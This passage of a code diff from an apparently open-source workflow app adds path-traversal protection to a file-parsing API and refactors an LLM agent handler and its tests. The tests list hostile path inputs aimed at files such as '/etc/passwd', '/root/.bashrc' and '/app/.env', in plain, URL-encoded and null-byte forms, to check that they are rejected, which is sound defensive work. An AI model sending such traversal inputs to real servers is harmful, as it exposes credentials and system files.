+            filePath: maliciousPath,
+          }),
+        })
+
+        const response = await POST(request)
+        const result = await response.json()
+
+        expect(result.success).toBe(false)
+        expect(result.error).toMatch(/Access denied|Invalid path/)
+      }
+    })
+
+    it('should reject absolute paths outside upload directory', async () => {
+      const maliciousPaths = [
+        '/etc/passwd',
+        '/root/.bashrc',
+        '/app/.env',
+        '/var/log/auth.log',
+        'C:\\Windows\\System32\\drivers\\etc\\hosts', // Windows path
+      ]
+
+      for (const maliciousPath of maliciousPaths) {
+        const request = new NextRequest('http://localhost:3000/api/files/parse', {
+          method: 'POST',
+          body: JSON.stringify({
+            filePath: maliciousPath,
+          }),
+        })
+
+        const response = await POST(request)
+        const result = await response.json()
+
+        expect(result.success).toBe(false)
+        expect(result.error).toMatch(/Access denied|Path outside allowed directory/)
+      }
+    })
+
+    it('should allow valid paths within upload directory', async () => {
+      // Test that valid paths don't trigger path validation errors
+      const validPaths = [
+        '/api/files/serve/document.txt',
+        '/api/files/serve/folder/file.pdf',
+        '/api/files/serve/subfolder/image.png',
+      ]
+
+      for (const validPath of validPaths) {
+        const request = new NextRequest('http://localhost:3000/api/files/parse', {
+          method: 'POST',
+          body: JSON.stringify({
+            filePath: validPath,
+          }),
+        })
+
+        const response = await POST(request)
+        const result = await response.json()
+
+        // Should not fail due to path validation (may fail for other reasons like file not found)
+        if (result.error) {
+          expect(result.error).not.toMatch(
+            /Access denied|Path outside allowed directory|Invalid path/
+          )
+        }
+      }
+    })
+
+    it('should handle encoded path traversal attempts', async () => {
+      const encodedMaliciousPaths = [
+        '/api/files/serve/%2e%2e%2f%2e%2e%2fetc%2fpasswd', // ../../../etc/passwd
+        '/api/files/serve/..%2f..%2f..%2fetc%2fpasswd',
+        '/api/files/serve/%2e%2e/%2e%2e/etc/passwd',
+      ]
+
+      for (const maliciousPath of encodedMaliciousPaths) {
+        const request = new NextRequest('http://localhost:3000/api/files/parse', {
+          method: 'POST',
+          body: JSON.stringify({
+            filePath: decodeURIComponent(maliciousPath), // Simulate URL decoding
+          }),
+        })
+
+        const response = await POST(request)
+        const result = await response.json()
+
+        expect(result.success).toBe(false)
+        expect(result.error).toMatch(/Access denied|Invalid path|Path outside allowed directory/)
+      }
+    })
+
+    it('should handle null byte injection attempts', async () => {
+      const nullBytePaths = [
+        '/api/files/serve/file.txt\0../../etc/passwd',
+        'file.txt\0/etc/passwd',
+        '/api/files/serve/document.pdf\0/var/log/auth.log',
+      ]
+
+      for (const maliciousPath of nullBytePaths) {
+        const request = new NextRequest('http://localhost:3000/api/files/parse', {
+          method: 'POST',
+          body: JSON.stringify({
+            filePath: maliciousPath,
+          }),
+        })
+
+        const response = await POST(request)
+        const result = await response.json()
+
+        expect(result.success).toBe(false)
+        // Should be rejected either by path validation or file system access
+      }
+    })
+  })
+
+  describe('Edge Cases', () => {
+    it('should handle empty file paths', async () => {
+      const request = new NextRequest('http://localhost:3000/api/files/parse', {
+        method: 'POST',
+        body: JSON.stringify({
+          filePath: '',
+        }),
+      })
+
+      const response = await POST(request)
+      const result = await response.json()
+
+      expect(response.status).toBe(400)
+      expect(result.error).toBe('No file path provided')
+    })
+
+    it('should handle missing filePath parameter', async () => {
+      const request = new NextRequest('http://localhost:3000/api/files/parse', {
+        method: 'POST',
+        body: JSON.stringify({}),
+      })
+
+      const response = await POST(request)
+      const result = await response.json()
+
+      expect(response.status).toBe(400)
+      expect(result.error).toBe('No file path provided')
+    })
+  })
+})
diff --git a/apps/sim/app/api/files/parse/route.ts b/apps/sim/app/api/files/parse/route.ts
index e8211fa1e1..c635a815bd 100644
--- a/apps/sim/app/api/files/parse/route.ts
+++ b/apps/sim/app/api/files/parse/route.ts
@@ -15,7 +15,6 @@ export const dynamic = 'force-dynamic'
 
 const logger = createLogger('FilesParseAPI')
 
-// Constants for URL downloads
 const MAX_DOWNLOAD_SIZE_BYTES = 100 * 1024 * 1024 // 100 MB
 const DOWNLOAD_TIMEOUT_MS = 30000 // 30 seconds
 
@@ -71,21 +70,6 @@ const fileTypeMap: Record<string, string> = {
   zip: 'application/zip',
 }
 
-// Binary file extensions
-const _binaryExtensions = [
-  'doc',
-  'docx',
-  'xls',
-  'xlsx',
-  'ppt',
-  'pptx',
-  'zip',
-  'png',
-  'jpg',
-  'jpeg',
-  'gif',
-]
-
 /**
  * Main API route handler
  */
@@ -529,11 +513,57 @@ async function parseBufferAsPdf(buffer: Buffer) {
   }
 }
 
+/**
+ * Validate that a file path is safe and within allowed directories
+ */
+function validateAndResolvePath(inputPath: string): {
+  isValid: boolean
+  resolvedPath?: string
+  error?: string
+} {
+  try {
+    let targetPath = inputPath
+    if (inputPath.startsWith('/api/files/serve/')) {
+      const filename = inputPath.replace('/api/files/serve/', '')
+      targetPath = path.join(UPLOAD_DIR, filename)
+    }
+
+    const resolvedPath = path.resolve(targetPath)
+    const resolvedUploadDir = path.resolve(UPLOAD_DIR)
+
+    if (
+      !resolvedPath.startsWith(resolvedUploadDir + path.sep) &&
+      resolvedPath !== resolvedUploadDir
+    ) {
+      return {
+        isValid: false,
+        error: `Access denied: Path outside allowed directory`,
+      }
+    }
+
+    if (inputPath.includes('..') || inputPath.includes('~')) {
+      return {
+        isValid: false,
+        error: `Access denied: Invalid path characters detected`,
+      }
+    }
+
+    return {
+      isValid: true,
+      resolvedPath,
+    }
+  } catch (error) {
+    return {
+      isValid: false,
+      error: `Path validation error: ${(error as Error).message}`,
+    }
+  }
+}
+
 /**
  * Handle a local file from the filesystem
  */
 async function handleLocalFile(filePath: string, fileType?: string): Promise<ParseResult> {
-  // Check if this is an S3 path that was incorrectly routed
   if (filePath.includes('/api/files/serve/s3/')) {
     logger.warn(`S3 path detected in handleLocalFile, redirecting to S3 handler: ${filePath}`)
     return handleS3File(filePath, fileType)
@@ -542,15 +572,19 @@ async function handleLocalFile(filePath: string, fileType?: string): Promise<Par
   try {
     logger.info(`Handling local file: ${filePath}`)
 
-    // Extract the filename from the path for API serve paths
-    let localFilePath = filePath
-    if (filePath.startsWith('/api/files/serve/')) {
-      const filename = filePath.replace('/api/files/serve/', '')
-      localFilePath = path.join(UPLOAD_DIR, filename)
-      logger.info(`Resolved API path to local file: ${localFilePath}`)
+    const pathValidation = validateAndResolvePath(filePath)
+    if (!pathValidation.isValid) {
+      logger.error(`Path validation failed: ${pathValidation.error}`, { filePath })
+      return {
+        success: false,
+        error: pathValidation.error || 'Invalid file path',
+        filePath,
+      }
     }
 
-    // Make sure the file is actually a file that exists
+    const localFilePath = pathValidation.resolvedPath!
+    logger.info(`Validated and resolved path: ${localFilePath}`)
+
     try {
       await fsPromises.access(localFilePath, fsPromises.constants.R_OK)
     } catch (error) {
diff --git a/apps/sim/app/api/function/execute/route.ts b/apps/sim/app/api/function/execute/route.ts
index 5063257a98..1d538ecc19 100644
--- a/apps/sim/app/api/function/execute/route.ts
+++ b/apps/sim/app/api/function/execute/route.ts
@@ -38,7 +38,7 @@ function resolveCodeVariables(
   for (const match of tagMatches) {
     const tagName = match.slice(1, -1).trim()
     const tagValue = params[tagName] || ''
-    resolvedCode = resolvedCode.replace(match, tagValue)
+    resolvedCode = resolvedCode.replace(match, JSON.stringify(tagValue))
   }
 
   return resolvedCode
@@ -61,6 +61,14 @@ export async function POST(req: NextRequest) {
       isCustomTool = false,
     } = body
 
+    logger.info(`[${requestId}] Function execution request`, {
+      hasCode: !!code,
+      paramsCount: Object.keys(params).length,
+      timeout,
+      workflowId,
+      isCustomTool,
+    })
+
     // Extract internal parameters that shouldn't be passed to the execution context
     const executionParams = { ...params }
     executionParams._context = undefined
@@ -181,7 +189,7 @@ export async function POST(req: NextRequest) {
               const errorMessage = `${args
                 .map((arg) => (typeof arg === 'object' ? JSON.stringify(arg) : String(arg)))
                 .join(' ')}\n`
-              logger.error(`[${requestId}] Code Console Error:`, errorMessage)
+              logger.error(`[${requestId}] Code Console Error: ${errorMessage}`)
               stdout += `ERROR: ${errorMessage}`
             },
           },
@@ -234,7 +242,7 @@ export async function POST(req: NextRequest) {
             const errorMessage = `${args
               .map((arg) => (typeof arg === 'object' ? JSON.stringify(arg) : String(arg)))
               .join(' ')}\n`
-            logger.error(`[${requestId}] Code Console Error:`, errorMessage)
+            logger.error(`[${requestId}] Code Console Error: ${errorMessage}`)
             stdout += `ERROR: ${errorMessage}`
           },
         },
diff --git a/apps/sim/app/api/providers/route.ts b/apps/sim/app/api/providers/route.ts
index 400b9e1a21..ee0cbc0157 100644
--- a/apps/sim/app/api/providers/route.ts
+++ b/apps/sim/app/api/providers/route.ts
@@ -36,6 +36,7 @@ export async function POST(request: NextRequest) {
       workflowId,
       stream,
       messages,
+      environmentVariables,
     } = body
 
     logger.info(`[${requestId}] Provider request details`, {
@@ -51,6 +52,8 @@ export async function POST(request: NextRequest) {
       stream: !!stream,
       hasMessages: !!messages?.length,
       messageCount: messages?.length || 0,
+      hasEnvironmentVariables:
+        !!environmentVariables && Object.keys(environmentVariables).length > 0,
     })
 
     let finalApiKey: string
@@ -89,6 +92,7 @@ export async function POST(request: NextRequest) {
       workflowId,
       stream,
       messages,
+      environmentVariables,
     })
 
     const executionTime = Date.now() - startTime
diff --git a/apps/sim/app/chat/[subdomain]/chat-client.tsx b/apps/sim/app/chat/[subdomain]/chat-client.tsx
index 85f56d6594..f9f27ba55a 100644
--- a/apps/sim/app/chat/[subdomain]/chat-client.tsx
+++ b/apps/sim/app/chat/[subdomain]/chat-client.tsx
@@ -407,21 +407,6 @@ export default function ChatClient({ subdomain }: { subdomain: string }) {
 
   return (
     <div className='fixed inset-0 z-[100] flex flex-col bg-background'>
-      <style jsx>{`
-        @keyframes growShrink {
-          0%,
-          100% {
-            transform: scale(0.9);
-          }
-          50% {
-            transform: scale(1.1);
-          }
-        }
-        .loading-dot {
-          animation: growShrink 1.5s infinite ease-in-out;
-        }
-      `}</style>
-
       {/* Header component */}
       <ChatHeader chatConfig={chatConfig} starCount={starCount} />
 
diff --git a/apps/sim/app/chat/[subdomain]/components/message-container/message-container.tsx b/apps/sim/app/chat/[subdomain]/components/message-container/message-container.tsx
index 44a41604af..6c59e578d2 100644
--- a/apps/sim/app/chat/[subdomain]/components/message-container/message-container.tsx
+++ b/apps/sim/app/chat/[subdomain]/components/message-container/message-container.tsx
@@ -30,6 +30,21 @@ export const ChatMessageContainer = memo(function ChatMessageContainer({
 }: ChatMessageContainerProps) {
   return (
     <div className='relative flex flex-1 flex-col overflow-hidden bg-white'>
+      <style jsx>{`
+        @keyframes growShrink {
+          0%,
+          100% {
+            transform: scale(0.9);
+          }
+          50% {
+            transform: scale(1.1);
+          }
+        }
+        .loading-dot {
+          animation: growShrink 1.5s infinite ease-in-out;
+        }
+      `}</style>
+
       {/* Scrollable Messages Area */}
       <div
         ref={messagesContainerRef}
diff --git a/apps/sim/executor/handlers/agent/agent-handler.test.ts b/apps/sim/executor/handlers/agent/agent-handler.test.ts
index 4a3d1c48b0..8151c9b124 100644
--- a/apps/sim/executor/handlers/agent/agent-handler.test.ts
+++ b/apps/sim/executor/handlers/agent/agent-handler.test.ts
@@ -1,6 +1,7 @@
 import { beforeEach, describe, expect, it, type Mock, vi } from 'vitest'
 import { isHosted } from '@/lib/environment'
 import { getAllBlocks } from '@/blocks'
+import { executeProviderRequest } from '@/providers'
 import { getProviderFromModel, transformBlockTool } from '@/providers/utils'
 import type { SerializedBlock, SerializedWorkflow } from '@/serializer/types'
 import { executeTool } from '@/tools'
@@ -21,6 +22,21 @@ vi.mock('@/providers/utils', () => ({
   getProviderFromModel: vi.fn().mockReturnValue('mock-provider'),
   transformBlockTool: vi.fn(),
   getBaseModelProviders: vi.fn().mockReturnValue({ openai: {}, anthropic: {} }),
+  getApiKey: vi.fn().mockReturnValue('mock-api-key'),
+  getProvider: vi.fn().mockReturnValue({
+    chat: {
+      completions: {
+        create: vi.fn().mockResolvedValue({
+          content: 'Mocked response content',
+          model: 'mock-model',
+          tokens: { prompt: 10, completion: 20, total: 30 },
+          toolCalls: [],
+          cost: 0.001,
+          timing: { total: 100 },
+        }),
+      },
+    },
+  }),
 }))
 
 vi.mock('@/blocks', () => ({
@@ -31,6 +47,17 @@ vi.mock('@/tools', () => ({
   executeTool: vi.fn(),
 }))
 
+vi.mock('@/providers', () => ({
+  executeProviderRequest: vi.fn().mockResolvedValue({
+    content: 'Mocked response content',
+    model: 'mock-model',
+    tokens: { prompt: 10, completion: 20, total: 30 },
+    toolCalls: [],
+    cost: 0.001,
+    timing: { total: 100 },
+  }),
+}))
+
 global.fetch = Object.assign(vi.fn(), { preconnect: vi.fn() }) as typeof fetch
 
 const mockGetAllBlocks = getAllBlocks as Mock
@@ -39,6 +66,7 @@ const mockIsHosted = isHosted as unknown as Mock
 const mockGetProviderFromModel = getProviderFromModel as Mock
 const mockTransformBlockTool = transformBlockTool as Mock
 const mockFetch = global.fetch as unknown as Mock
+const mockExecuteProviderRequest = executeProviderRequest as Mock
 
 describe('AgentBlockHandler', () => {
   let handler: AgentBlockHandler
@@ -50,7 +78,12 @@ describe('AgentBlockHandler', () => {
     handler = new AgentBlockHandler()
     vi.clearAllMocks()
 
-    // Save original Promise.all to restore later
+    Object.defineProperty(global, 'window', {
+      value: {},
+      writable: true,
+      configurable: true,
+    })
+
     originalPromiseAll = Promise.all
 
     mockBlock = {
@@ -85,7 +118,7 @@ describe('AgentBlockHandler', () => {
         loops: {},
       } as SerializedWorkflow,
     }
-    mockIsHosted.mockReturnValue(false) // Default to non-hosted env for tests
+    mockIsHosted.mockReturnValue(false)
     mockGetProviderFromModel.mockReturnValue('mock-provider')
 
     mockFetch.mockImplementation(() => {
@@ -130,8 +163,15 @@ describe('AgentBlockHandler', () => {
   })
 
   afterEach(() => {
-    // Restore original Promise.all
     Promise.all = originalPromiseAll
+
+    try {
+      Object.defineProperty(global, 'window', {
+        value: undefined,
+        writable: true,
+        configurable: true,
+      })
+    } catch (e) {}
   })
 
   describe('canHandle', () => {
@@ -164,7 +204,7 @@ describe('AgentBlockHandler', () => {
         userPrompt: 'User query: Hello!',
         temperature: 0.7,
         maxTokens: 100,
-        apiKey: 'test-api-key', // Add API key for non-hosted env
+        apiKey: 'test-api-key',
       }
 
       mockGetProviderFromModel.mockReturnValue('openai')
@@ -193,7 +233,6 @@ describe('AgentBlockHandler', () => {
       Promise.all = vi.fn().mockImplementation((promises: Promise<any>[]) => {
         const result = originalPromiseAll.call(Promise, promises)
 
-        // When result resolves, capture the tools
         result.then((tools: any[]) => {
           if (tools?.length) {
             capturedTools = tools.filter((t) => t !== null)
@@ -255,7 +294,7 @@ describe('AgentBlockHandler', () => {
                 },
               },
             },
-            usageControl: 'auto',
+            usageControl: 'auto' as const,
           },
           {
             type: 'custom-tool',
@@ -274,7 +313,7 @@ describe('AgentBlockHandler', () => {
                 },
               },
             },
-            usageControl: 'force',
+            usageControl: 'force' as const,
           },
           {
             type: 'custom-tool',
@@ -293,7 +332,7 @@ describe('AgentBlockHandler', () => {
                 },
               },
             },
-            usageControl: 'none', // This tool should be filtered out
+            usageControl: 'none' as const,
           },
         ],
       }
@@ -355,21 +394,21 @@ describe('AgentBlockHandler', () => {
             title: 'Tool 1',
             type: 'tool-type-1',
             operation: 'operation1',
-            usageControl: 'auto', // default setting
+            usageControl: 'auto' as const,
           },
           {
             id: 'tool_2',
             title: 'Tool 2',
             type: 'tool-type-2',
             operation: 'operation2',
-            usageControl: 'none', // should be filtered out
+            usageControl: 'none' as const,
           },
           {
             id: 'tool_3',
             title: 'Tool 3',
             type: 'tool-type-3',
             operation: 'operation3',
-            usageControl: 'force', // should be included
+            usageControl: 'force' as const,
           },
         ],
       }
@@ -400,14 +439,14 @@ describe('AgentBlockHandler', () => {
             title: 'Tool 1',
             type: 'tool-type-1',
             operation: 'operation1',
-            usageControl: 'auto',
+            usageControl: 'auto' as const,
           },
           {
             id: 'tool_2',
             title: 'Tool 2',
             type: 'tool-type-2',
             operation: 'operation2',
-            usageControl: 'force',
+            usageControl: 'force' as const,
           },
         ],
       }
@@ -449,7 +488,7 @@ describe('AgentBlockHandler', () => {
                 },
               },
             },
-            usageControl: 'auto',
+            usageControl: 'auto' as const,
           },
           {
             type: 'custom-tool',
@@ -464,7 +503,7 @@ describe('AgentBlockHandler', () => {
                 },
               },
             },
-            usageControl: 'force',
+            usageControl: 'force' as const,
           },
           {
             type: 'custom-tool',
@@ -479,7 +518,7 @@ describe('AgentBlockHandler', () => {
                 },
               },
             },
-            usageControl: 'none', // Should be filtered out
+            usageControl: 'none' as const,
           },
         ],
       }
@@ -635,6 +674,8 @@ describe('AgentBlockHandler', () => {
               model: 'mock-model',
               tokens: { prompt: 10, completion: 20, total: 30 },
               timing: { total: 100 },
+              toolCalls: [],
+              cost: undefined,
             }),
         })
       })
@@ -654,7 +695,9 @@ describe('AgentBlockHandler', () => {
           result: 'Success',
           score: 0.95,
           tokens: { prompt: 10, completion: 20, total: 30 },
+          toolCalls: { list: [], count: 0 },
           providerTiming: { total: 100 },
+          cost: undefined,
         },
       })
     })
@@ -729,23 +772,35 @@ describe('AgentBlockHandler', () => {
     })
 
     it('should handle streaming responses with text/event-stream content type', async () => {
-      const mockStreamBody = {
-        getReader: vi.fn().mockReturnValue({
-          read: vi.fn().mockResolvedValue({ done: true, value: undefined }),
-        }),
-      }
+      const mockStreamBody = new ReadableStream({
+        start(controller) {
+          controller.close()
+        },
+      })
 
       mockFetch.mockImplementationOnce(() => {
         return Promise.resolve({
           ok: true,
           headers: {
             get: (name: string) => {
-              if (name === 'Content-Type') return 'text/event-stream'
+              if (name === 'Content-Type') return 'application/json'
               if (name === 'X-Execution-Data') return null
               return null
             },
           },
-          body: mockStreamBody,
+          json: () =>
+            Promise.resolve({
+              stream: mockStreamBody,
+              execution: {
+                success: true,
+                output: { response: {} },
+                logs: [],
+                metadata: {
+                  duration: 0,
+                  startTime: new Date().toISOString(),
+                },
+              },
+            }),
         })
       })
 
@@ -771,11 +826,11 @@ describe('AgentBlockHandler', () => {
     })
 
     it('should handle streaming responses with execution data in header', async () => {
-      const mockStreamBody = {
-        getReader: vi.fn().mockReturnValue({
-          read: vi.fn().mockResolvedValue({ done: true, value: undefined }),
-        }),
-      }
+      const mockStreamBody = new ReadableStream({
+        start(controller) {
+          controller.close()
+        },
+      })
 
       const mockExecutionData = {
         success: true,
@@ -807,12 +862,16 @@ describe('AgentBlockHandler', () => {
           ok: true,
           headers: {
             get: (name: string) => {
-              if (name === 'Content-Type') return 'text/event-stream'
+              if (name === 'Content-Type') return 'application/json'
               if (name === 'X-Execution-Data') return JSON.stringify(mockExecutionData)
               return null
             },
           },
-          body: mockStreamBody,
+          json: () =>
+            Promise.resolve({
+              stream: mockStreamBody,
+              execution: mockExecutionData,
+            }),
         })
       })
 
diff --git a/apps/sim/executor/handlers/agent/agent-handler.ts b/apps/sim/executor/handlers/agent/agent-handler.ts
index 70984ae3d8..50a65de073 100644
--- a/apps/sim/executor/handlers/agent/agent-handler.ts
+++ b/apps/sim/executor/handlers/agent/agent-handler.ts
@@ -2,14 +2,21 @@ import { env } from '@/lib/env'
 import { createLogger } from '@/lib/logs/console-logger'
 import { getAllBlocks } from '@/blocks'
 import type { BlockOutput } from '@/blocks/types'
-import { getProviderFromModel, transformBlockTool } from '@/providers/utils'
+import { executeProviderRequest } from '@/providers'
+import { getApiKey, getProviderFromModel, transformBlockTool } from '@/providers/utils'
 import type { SerializedBlock } from '@/serializer/types'
 import { executeTool } from '@/tools'
 import { getTool, getToolAsync } from '@/tools/utils'
 import type { BlockHandler, ExecutionContext, StreamingExecution } from '../../types'
+import type { AgentInputs, Message, StreamingConfig, ToolInput } from './types'
 
 const logger = createLogger('AgentBlockHandler')
 
+const DEFAULT_MODEL = 'gpt-4o'
+const DEFAULT_FUNCTION_TIMEOUT = 5000
+const REQUEST_TIMEOUT = 120000
+const CUSTOM_TOOL_PREFIX = 'custom_'
+
 /**
  * Handler for Agent blocks that process LLM requests with optional tools.
  */
@@ -20,698 +27,676 @@ export class AgentBlockHandler implements BlockHandler {
 
   async execute(
     block: SerializedBlock,
-    inputs: Record<string, any>,
+    inputs: AgentInputs,
     context: ExecutionContext
   ): Promise<BlockOutput | StreamingExecution> {
     logger.info(`Executing agent block: ${block.id}`)
 
-    // Parse response format if provided
-    let responseFormat: any
-    if (inputs.responseFormat) {
-      // Handle empty string case - treat it as no response format
-      if (inputs.responseFormat === '') {
-        responseFormat = undefined
-      } else {
-        try {
-          responseFormat =
-            typeof inputs.responseFormat === 'string'
-              ? JSON.parse(inputs.responseFormat)
-              : inputs.responseFormat
-
-          // Ensure the responseFormat is properly structured
-          if (responseFormat && typeof responseFormat === 'object') {
-            // If it's just a raw schema without the expected wrapper properties,
-            // wrap it properly for the provider
-            if (!responseFormat.schema && !responseFormat.name) {
-              responseFormat = {
-                name: 'response_schema',
-                schema: responseFormat,
-                strict: true,
-              }
-            }
+    const responseFormat = this.parseResponseFormat(inputs.responseFormat)
+    const model = inputs.model || DEFAULT_MODEL
+    const providerId = getProviderFromModel(model)
+    const formattedTools = await this.formatTools(inputs.tools || [], context)
+    const streamingConfig = this.getStreamingConfig(block, context)
+    const messages = this.buildMessages(inputs)
+
+    const providerRequest = this.buildProviderRequest({
+      providerId,
+      model,
+      messages,
+      inputs,
+      formattedTools,
+      responseFormat,
+      context,
+      streaming: streamingConfig.shouldUseStreaming ?? false,
+    })
+
+    this.logRequestDetails(providerRequest, messages, streamingConfig)
+
+    return this.executeProviderRequest(providerRequest, block, responseFormat, context)
+  }
+
+  private parseResponseFormat(responseFormat?: string | object): any {
+    if (!responseFormat || responseFormat === '') return undefined
+
+    try {
+      const parsed =
+        typeof responseFormat === 'string' ? JSON.parse(responseFormat) : responseFormat
+
+      if (parsed && typeof parsed === 'object' && !parsed.schema && !parsed.name) {
+        return {
+          name: 'response_schema',
+          schema: parsed,
+          strict: true,
+        }
+      }
+      return parsed
+    } catch (error: any) {
+      logger.error('Failed to parse response format:', { error })
+      throw new Error(`Invalid response format: ${error.message}`)
+    }
+  }
+
+  private async formatTools(inputTools: ToolInput[], context: ExecutionContext): Promise<any[]> {
+    if (!Array.isArray(inputTools)) return []
+
+    const tools = await Promise.all(
+      inputTools
+        .filter((tool) => {
+          const usageControl = tool.usageControl || 'auto'
+          return usageControl !== 'none'
+        })
+        .map(async (tool) => {
+          if (tool.type === 'custom-tool' && tool.schema) {
+            return this.createCustomTool(tool, context)
           }
-        } catch (error: any) {
-          logger.error('Failed to parse response format:', { error })
-          throw new Error(`Invalid response format: ${error.message}`)
+          return this.transformBlockTool(tool, context)
+        })
+    )
+
+    return tools.filter(
+      (tool): tool is NonNullable<typeof tool> => tool !== null && tool !== undefined
+    )
+  }
+
+  private createCustomTool(tool: ToolInput, context: ExecutionContext): any {
+    const base: any = {
+      id: `${CUSTOM_TOOL_PREFIX}${tool.title}`,
+      name: tool.schema.function.name,
+      description: tool.schema.function.description || '',
+      params: tool.params || {},
+      parameters: {
+        type: tool.schema.function.parameters.type,
+        properties: tool.schema.function.parameters.properties,
+        required: tool.schema.function.parameters.required || [],
+      },
+      usageControl: tool.usageControl || 'auto',
+    }
+
+    if (tool.code) {
+      base.executeFunction = async (callParams: Record<string, any>) => {
+        const result = await executeTool('function_execute', {
+          code: tool.code,
+          ...tool.params,
+          ...callParams,
+          timeout: tool.timeout ?? DEFAULT_FUNCTION_TIMEOUT,
+          envVars: context.environmentVariables || {},
+          isCustomTool: true,
+          _context: { workflowId: context.workflowId },
+        })
+
+        if (!result.success) {
+          throw new Error(result.error || 'Function execution failed')
         }
+        return result.output
       }
     }
 
-    const model = inputs.model || 'gpt-4o'
-    const providerId = getProviderFromModel(model)
-    logger.info(`Using provider: ${providerId}, model: ${model}`)
-
-    // Format tools for provider API
-    const formattedTools = Array.isArray(inputs.tools)
-      ? (
-          await Promise.all(
-            // First filter out any tools with usageControl set to 'none'
-            inputs.tools
-              .filter((tool: any) => {
-                const usageControl = tool.usageControl || 'auto'
-                if (usageControl === 'none') {
-                  logger.info(`Filtering out tool set to 'none': ${tool.title || tool.type}`)
-                  return false
-                }
-                return true
-              })
-              .map(async (tool: any) => {
-                // Handle custom tools
-                if (tool.type === 'custom-tool' && tool.schema) {
-                  // Add function execution capability to custom tools with code
-                  if (tool.code) {
-                    // Store the tool's code and make it available for execution
-                    const toolName = tool.schema.function.name
-                    const params = tool.params || {}
-
-                    // Create a tool that can execute the code
-                    return {
-                      id: `custom_${tool.title}`,
-                      name: toolName,
-                      description: tool.schema.function.description || '',
-                      params: params,
-                      parameters: {
-                        type: tool.schema.function.parameters.type,
-                        properties: tool.schema.function.parameters.properties,
-                        required: tool.schema.function.parameters.required || [],
-                      },
-                      usageControl: tool.usageControl || 'auto',
-                      executeFunction: async (callParams: Record<string, any>) => {
-                        try {
-                          // Execute the code using the function_execute tool
-                          const result = await executeTool('function_execute', {
-                            code: tool.code,
-                            ...params,
-                            ...callParams,
-                            timeout: tool.timeout || 5000,
-                          })
-
-                          if (!result.success) {
-                            throw new Error(result.error || 'Function execution failed')
-                          }
-
-                          return result.output
-                        } catch (error: any) {
-                          logger.error(`Error executing custom tool ${toolName}:`, error)
-                          throw new Error(`Error in ${toolName}: ${error.message}`)
-                        }
-                      },
-                    }
-                  }
-
-                  return {
-                    id: `custom_${tool.title}`,
-                    name: tool.schema.function.name,
-                    description: tool.schema.function.description || '',
-                    params: tool.params || {},
-                    parameters: {
-                      type: tool.schema.function.parameters.type,
-                      properties: tool.schema.function.parameters.properties,
-                      required: tool.schema.function.parameters.required || [],
-                    },
-                    usageControl: tool.usageControl || 'auto',
-                  }
-                }
-
-                // Handle regular block tools with operation selection
-                const transformedTool = await transformBlockTool(tool, {
-                  selectedOperation: tool.operation,
-                  getAllBlocks,
-                  getToolAsync: (toolId: string) => getToolAsync(toolId, context.workflowId),
-                  getTool,
-                })
-
-                // Add usageControl to the transformed tool if it exists
-                if (transformedTool) {
-                  transformedTool.usageControl = tool.usageControl || 'auto'
-                }
-
-                return transformedTool
-              })
-          )
-        ).filter((t: any): t is NonNullable<typeof t> => t !== null)
-      : []
-
-    // Check if streaming is requested and this block is selected for streaming
+    return base
+  }
+
+  private async transformBlockTool(tool: ToolInput, context: ExecutionContext) {
+    const transformedTool = await transformBlockTool(tool, {
+      selectedOperation: tool.operation,
+      getAllBlocks,
+      getToolAsync: (toolId: string) => getToolAsync(toolId, context.workflowId),
+      getTool,
+    })
+
+    if (transformedTool) {
+      transformedTool.usageControl = tool.usageControl || 'auto'
+    }
+    return transformedTool
+  }
+
+  private getStreamingConfig(block: SerializedBlock, context: ExecutionContext): StreamingConfig {
     const isBlockSelectedForOutput =
       context.selectedOutputIds?.some((outputId) => {
-        // First check for direct match (if the entire outputId is the blockId)
-        if (outputId === block.id) {
-          logger.info(`Direct match found for block ${block.id} in selected outputs`)
-          return true
-        }
-
-        // Then try parsing the blockId from the blockId_path format
+        if (outputId === block.id) return true
         const firstUnderscoreIndex = outputId.indexOf('_')
-        if (firstUnderscoreIndex !== -1) {
-          const blockId = outputId.substring(0, firstUnderscoreIndex)
-          const isMatch = blockId === block.id
-          if (isMatch) {
-            logger.info(
-              `Path match found for block ${block.id} in selected outputs (from ${outputId})`
-            )
-          }
-          return isMatch
-        }
-        return false
+        return (
+          firstUnderscoreIndex !== -1 && outputId.substring(0, firstUnderscoreIndex) === block.id
+        )
       }) ?? false
 
-    // Check if this block has any outgoing connections
     const hasOutgoingConnections = context.edges?.some((edge) => edge.source === block.id) ?? false
-
-    // Determine if we should use streaming for this block
-    const shouldUseStreaming = context.stream && isBlockSelectedForOutput
+    const shouldUseStreaming = Boolean(context.stream) && isBlockSelectedForOutput
 
     if (shouldUseStreaming) {
-      logger.info(
-        `Block ${block.id} will use streaming response (selected for output with no outgoing connections)`
-      )
+      logger.info(`Block ${block.id} will use streaming response`)
     }
 
-    // Initialize parsedMessages - will be built from memories/prompts if provided
-    let parsedMessages: any[] | undefined
+    return { shouldUseStreaming, isBlockSelectedForOutput, hasOutgoingConnections }
+  }
 
-    // Check if we're in advanced mode with the memories field
-    if (inputs.memories || (inputs.systemPrompt && inputs.userPrompt)) {
-      const messages: any[] = []
+  private buildMessages(inputs: AgentInputs): Message[] | undefined {
+    if (!inputs.memories && !(inputs.systemPrompt && inputs.userPrompt)) {
+      return undefined
+    }
 
-      if (inputs.memories) {
-        const memories = inputs.memories
+    const messages: Message[] = []
 
-        const memoryMessages = processMemories(memories, logger)
-        messages.push(...memoryMessages)
-      }
+    if (inputs.memories) {
+      messages.push(...this.processMemories(inputs.memories))
+    }
 
-      // Handle system prompt with clear precedence rules
-      if (inputs.systemPrompt) {
-        // Check for existing system messages in memories
-        const systemMessages = messages.filter((msg) => msg.role === 'system')
-
-        if (systemMessages.length > 1) {
-          logger.warn(
-            `Found ${systemMessages.length} system messages in memories. Explicit systemPrompt will take precedence.`
-          )
-        } else if (systemMessages.length === 1) {
-          logger.info(
-            'Found system message in memories. Explicit systemPrompt will take precedence.'
-          )
-        }
+    if (inputs.systemPrompt) {
+      this.addSystemPrompt(messages, inputs.systemPrompt)
+    }
 
-        // Remove any existing system messages and add the explicit one at the beginning
-        messages.splice(0, 0, {
-          role: 'system',
-          content: inputs.systemPrompt,
-        })
+    if (inputs.userPrompt) {
+      this.addUserPrompt(messages, inputs.userPrompt)
+    }
 
-        // Remove any other system messages that came from memories
-        for (let i = messages.length - 1; i >= 1; i--) {
-          if (messages[i].role === 'system') {
-            messages.splice(i, 1)
-          }
-        }
+    return messages.length > 0 ? messages : undefined
+  }
 
-        logger.info(
-          'Added explicit system prompt as first message, removed any system messages from memories'
-        )
-      } else {
-        // No explicit system prompt provided, check for multiple system messages in memories
